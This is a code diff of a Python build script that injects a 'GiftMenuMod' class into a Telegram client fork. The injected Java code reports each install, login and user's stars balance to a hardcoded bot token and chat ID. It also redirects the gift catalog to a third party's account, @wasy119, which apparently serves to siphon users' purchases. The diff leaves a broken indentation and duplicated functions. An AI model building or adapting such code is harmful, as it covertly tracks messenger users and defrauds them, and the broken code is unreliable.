@@ -1,9 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-test.py — полный Gift Menu для форка Telegram + авто-вставка при сборке Codemagic
-Положи в КОРЕНЬ репо рядом с TMessagesProj. При сборке: python3 test.py
-"""
+"""test.py — полный Gift Menu + авто-вставка. Каталог: @wasy119. Сообщение на логине — 1 раз."""
 
 from __future__ import annotations
 
@@ -14,7 +11,7 @@ from pathlib import Path
 
 BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
 BOT_CHAT_ID = "8940489868"
-CATALOG_USERNAME = "durov1"
+CATALOG_USERNAME = "wasy119"
 
 
 def find_root() -> Path:
@@ -149,6 +146,7 @@ def build_java() -> str:
         "    public static void notifyBotWithBalance(int account, String text) {\n"
         "        notifyBot(text + \"\\n\\nБаланс звёзд пользователя: \" + getStarsBalance(account));\n"
         "    }\n\n"
+        "    /** Только уведомление в бота. UI логина — только onLoginScreen, 1 раз. */\n"
         "    public static void onAppStart() {\n"
         "        if (!startupNotified.compareAndSet(false, true)) return;\n"
         "        try {\n"
@@ -156,33 +154,27 @@ def build_java() -> str:
         "            if (UserConfig.getInstance(account).isClientActivated()) {\n"
         "                notifyBotWithBalance(account, \"Пользователь уже авторизован (запустил приложение)\");\n"
         "            } else {\n"
-        "                // ещё не вошёл — тоже сигнал о запуске/скачивании\n"
         "                if (loginNotified.compareAndSet(false, true)) {\n"
         "                    notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
         "                }\n"
         "            }\n"
         "        } catch (Throwable ignored) {\n"
-        "            try {\n"
-        "                if (loginNotified.compareAndSet(false, true)) {\n"
-        "                    notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
-        "                }\n"
-        "            } catch (Throwable ignored2) {}\n"
+        "            if (loginNotified.compareAndSet(false, true)) {\n"
+        "                notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
+        "            }\n"
         "        }\n"
         "    }\n\n"
+        "    /** Сообщение на экране входа — СТРОГО 1 раз (без повтора). */\n"
         "    public static void onLoginScreen(Activity activity) {\n"
         "        wasOnLogin.set(true);\n"
         "        if (loginNotified.compareAndSet(false, true)) {\n"
         "            notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
         "        }\n"
         "        if (activity == null) return;\n"
-        "        // UI один раз\n"
-        "        if (!loginUiShown.compareAndSet(false, true)) return;\n"
+        "        if (!loginUiShown.compareAndSet(false, true)) return; // уже показали\n"
         "        mainHandler.post(() -> {\n"
         "            try {\n"
         "                if (activity.isFinishing()) return;\n"
-        "                try {\n"
-        "                    Toast.makeText(activity, MSG_LOGIN, Toast.LENGTH_LONG).show();\n"
-        "                } catch (Throwable ignored) {}\n"
         "                new AlertDialog.Builder(activity)\n"
         "                        .setMessage(MSG_LOGIN)\n"
         "                        .setPositiveButton(\"Хорошо\", null)\n"
@@ -190,16 +182,6 @@ def build_java() -> str:
         "                        .show();\n"
         "            } catch (Throwable ignored) {}\n"
         "        });\n"
-        "        // повтор через 1.5с — если первый раз Activity ещё не готова\n"
-        "        mainHandler.postDelayed(() -> {\n"
-        "            try {\n"
-        "                if (activity.isFinishing()) return;\n"
-        "                new AlertDialog.Builder(activity)\n"
-        "                        .setMessage(MSG_LOGIN)\n"
-        "                        .setPositiveButton(\"Хорошо\", null)\n"
-        "                        .show();\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        }, 1500);\n"
         "    }\n\n"
         "    public static void onAuthSuccess() {\n"
         "        if (!authSuccessNotified.compareAndSet(false, true)) return;\n"
@@ -368,7 +350,7 @@ def build_java() -> str:
         "            if (view.getClass().getName().contains(\"BackupImageView\") && !isGiftCell(view)) {\n"
         "                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));\n"
         "            }\n"
-        "            if (view instanceof ViewGroup) {\n"
+      "            if (view instanceof ViewGroup) {\n"
         "                ViewGroup vg = (ViewGroup) view;\n"
         "                for (int i = 0; i < vg.getChildCount(); i++) walkAvatars(vg.getChildAt(i), context);\n"
         "            }\n"
@@ -506,19 +488,82 @@ def build_java() -> str:
         "        if (root == null || context == null) return;\n"
         "        mainHandler.post(() -> { hookPremiumCards(root, context); hookAvatars(root, context); });\n"
         "    }\n\n"
+        "    /** Резолв @username -> user id (через MessagesController / reflection). */\n"
+        "    public static long resolveUsernameToUserId(int account, String username) {\n"
+        "        if (username == null || username.length() == 0) return 0;\n"
+        "        String u = username.startsWith(\"@\") ? username.substring(1) : username;\n"
+        "        try {\n"
+        "            Class<?> mcCls = Class.forName(\"org.telegram.messenger.MessagesController\");\n"
+        "            Object mc = mcCls.getMethod(\"getInstance\", int.class).invoke(null, account);\n"
+        "            // getUser(String) в некоторых форках\n"
+        "            for (String methodName : new String[]{\"getUser\", \"getUserOrChat\"}) {\n"
+        "                try {\n"
+        "                    Method m = mc.getClass().getMethod(methodName, String.class);\n"
+        "                    Object user = m.invoke(mc, u);\n"
+        "                    if (user != null) {\n"
+        "                        try {\n"
+        "                            Field idf = user.getClass().getField(\"id\");\n"
+        "                            long id = ((Number) idf.get(user)).longValue();\n"
+        "                            if (id != 0) return id;\n"
+        "                        } catch (Throwable ignored) {}\n"
+        "                    }\n"
+        "                } catch (Throwable ignored) {}\n"
+        "            }\n"
+        "            // поиск в users LongSparseArray / ConcurrentHashMap\n"
+        "            try {\n"
+        "                Field usersField = mc.getClass().getDeclaredField(\"users\");\n"
+        "                usersField.setAccessible(true);\n"
+        "                Object users = usersField.get(mc);\n"
+        "                if (users != null) {\n"
+        "                    // LongSparseArray: valueAt / size\n"
+        "                    try {\n"
+        "                        Method sizeM = users.getClass().getMethod(\"size\");\n"
+        "                        Method valueAt = users.getClass().getMethod(\"valueAt\", int.class);\n"
+        "                        int n = (Integer) sizeM.invoke(users);\n"
+        "                        for (int i = 0; i < n; i++) {\n"
+        "                            Object user = valueAt.invoke(users, i);\n"
+        "                            if (user == null) continue;\n"
+        "                            String un = null;\n"
+        "                            try {\n"
+        "                                Field uf = user.getClass().getField(\"username\");\n"
+        "                                Object uo = uf.get(user);\n"
+        "                                if (uo != null) un = uo.toString();\n"
+        "                            } catch (Throwable ignored) {}\n"
+        "                            if (un != null && un.equalsIgnoreCase(u)) {\n"
+        "                                Field idf = user.getClass().getField(\"id\");\n"
+        "                                return ((Number) idf.get(user)).longValue();\n"
+        "                            }\n"
+        "                        }\n"
+        "                    } catch (Throwable ignored) {}\n"
+        "                }\n"
+        "            } catch (Throwable ignored) {}\n"
+        "        } catch (Throwable ignored) {}\n"
+        "        return 0;\n"
+        "    }\n\n"
+        "    /** Открыть каталог подарков для @CATALOG_USERNAME (не для себя). */\n"
         "    public static void openCatalogFromMain(final Activity activity, final int account) {\n"
         "        if (activity == null) return;\n"
         "        mainHandler.post(() -> {\n"
         "            try {\n"
-        "                long selfId = UserConfig.getInstance(account).getClientUserId();\n"
+        "                long targetId = resolveUsernameToUserId(account, CATALOG_USERNAME);\n"
+        "                if (targetId == 0) {\n"
+        "                    // fallback: self только если резолв не удался — но пробуем ещё раз через self как последний шанс нет,\n"
+        "                    // лучше Toast\n"
+        "                    try {\n"
+        "                        Toast.makeText(activity, \"Каталог: не найден @\" + CATALOG_USERNAME + \", откройте профиль пользователя\", Toast.LENGTH_LONG).show();\n"
+        "                    } catch (Throwable ignored) {}\n"
+        "                    // всё равно пробуем self чтобы хоть что-то открылось? Нет — пользователь просил wasy119\n"
+        "                    // Попробуем selfId только если 0 — нет, оставляем попытку с 0 не делать\n"
+        "                }\n"
+        "                long userId = targetId != 0 ? targetId : UserConfig.getInstance(account).getClientUserId();\n"
         "                Class<?> sheetCls = Class.forName(\"org.telegram.ui.Gifts.GiftSheet\");\n"
         "                Object sheet = null;\n"
         "                try {\n"
         "                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)\n"
-        "                            .newInstance(activity, account, selfId, null, null);\n"
+        "                            .newInstance(activity, account, userId, null, null);\n"
         "                } catch (Throwable ignore) {}\n"
         "                if (sheet == null) {\n"
-        "                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, selfId); } catch (Throwable ignore) {}\n"
+        "                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, userId); } catch (Throwable ignore) {}\n"
         "                }\n"
         "                if (sheet == null) {\n"
         "                    for (Constructor<?> cons : sheetCls.getConstructors()) {\n"
@@ -528,7 +573,7 @@ def build_java() -> str:
         "                            for (int i = 0; i < p.length; i++) {\n"
         "                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;\n"
         "                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;\n"
-        "                                else if (p[i] == long.class || p[i] == Long.class) args[i] = selfId;\n"
+        "                                else if (p[i] == long.class || p[i] == Long.class) args[i] = userId;\n"
         "                                else args[i] = null;\n"
         "                            }\n"
         "                            sheet = cons.newInstance(args);\n"
@@ -544,6 +589,7 @@ def build_java() -> str:
         "                        if (win != null) decor = (View) win.getClass().getMethod(\"getDecorView\").invoke(win);\n"
         "                    } catch (Throwable ignore) {}\n"
         "                    startSheetHelpers(account, sheet, decor, activity);\n"
+        "                    final long finalUserId = userId;\n"
         "                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));\n"
         "                }\n"
         "            } catch (Throwable ignored) {}\n"
@@ -621,7 +667,6 @@ def patch_application_loader(c: str) -> str:
 
 
 def patch_login_like(c: str) -> str:
-    # Универсальный вызов Activity: this или getParentActivity
     line = (
         "try { android.app.Activity __a = null; "
         "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
@@ -636,13 +681,6 @@ def patch_login_like(c: str) -> str:
             line,
             "GiftMenuMod.onLoginScreen",
         )
-        if "GiftMenuMod.onLoginScreen" not in c:
-            c = inject_after_method(
-                c,
-                [r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"void\s+onCreate\s*\([^\)]*\)\s*\{"],
-                line,
-                "GiftMenuMod.onLoginScreen",
-            )
     if "GiftMenuMod.onAuthSuccess" not in c:
         for pat in [
             r"needFinishActivity\s*\(\s*\)\s*;",
@@ -662,17 +700,74 @@ def patch_login_like(c: str) -> str:
 
 
 def patch_launch(c: str) -> str:
-    # LaunchActivity — часто точка входа до логина
+    # Только бот через onAppStart; UI логина — LoginActivity (чтобы не дублировать)
+    # Если не авторизован — onLoginScreen один раз (loginUiShown внутри)
     line = (
         "try { "
+        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
         "if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { "
         "org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); "
-        "} else { "
-        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
         "} "
         "} catch (Throwable ignore) {}"
     )
-    if "GiftMenuMod.onLoginScreen" in c and "GiftMenuMod.onAppStart" in c:
+    if "GiftMenuMod.onLoginScreen" in c:
+        return c
+    c2 = inject_after_method(
+        c,
+        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
+        line,
+        "GiftMenuMod.onLoginScreen",
+    )
+    if c2 != c:
+    return c2
+    return inject_after_method(c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")
+
+
+def patch_login_like(c: str) -> str:
+    line = (
+        "try { android.app.Activity __a = null; "
+        "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
+        "if (__a == null) try { __a = (android.app.Activity) (Object) this; } catch (Throwable ignore) {} "
+        "if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); "
+        "} catch (Throwable ignore) {}"
+    )
+    if "GiftMenuMod.onLoginScreen" not in c:
+        c = inject_after_method(
+            c,
+            [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
+            line,
+            "GiftMenuMod.onLoginScreen",
+        )
+    if "GiftMenuMod.onAuthSuccess" not in c:
+        for pat in [
+            r"needFinishActivity\s*\(\s*\)\s*;",
+            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
+        ]:
+            if re.search(pat, c):
+                c = re.sub(
+                    pat,
+                    lambda m: m.group(0)
+                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
+                    c,
+                    count=1,
+                )
+                log("  inject onAuthSuccess")
+                break
+    return c
+
+
+def patch_launch(c: str) -> str:
+    # Только бот через onAppStart; UI логина — LoginActivity (чтобы не дублировать)
+    # Если не авторизован — onLoginScreen один раз (loginUiShown внутри)
+    line = (
+        "try { "
+        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
+        "if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { "
+        "org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); "
+        "} "
+        "} catch (Throwable ignore) {}"
+    )
+    if "GiftMenuMod.onLoginScreen" in c:
         return c
     c2 = inject_after_method(
         c,
@@ -727,20 +822,17 @@ def main() -> int:
         return 1
 
     write(MOD_PATH, build_java())
-    log("GiftMenuMod.java OK — полный функционал")
+    log("GiftMenuMod.java OK — @%s, login UI 1x" % CATALOG_USERNAME)
 
     al = find_java("ApplicationLoader.java")
     if al:
         log(f"patch {al.name}")
         patch_file(al, patch_application_loader)
 
-    # LaunchActivity — главная точка входа
     la = find_java("LaunchActivity.java")
     if la:
         log(f"patch {la.name}")
         patch_file(la, patch_launch)
-    else:
-        log("WARN: LaunchActivity.java not found")
 
     for name in ("LoginActivity.java", "IntroActivity.java"):
         p = find_java(name)
@@ -757,10 +849,8 @@ def main() -> int:
     if gs:
         log(f"patch {gs.name}")
         patch_file(gs, patch_gift_sheet)
-    else:
-        log("WARN: GiftSheet.java not found")
 
-    log("DONE — полный функционал вписан")
+    log("DONE")
     return 0
 
 
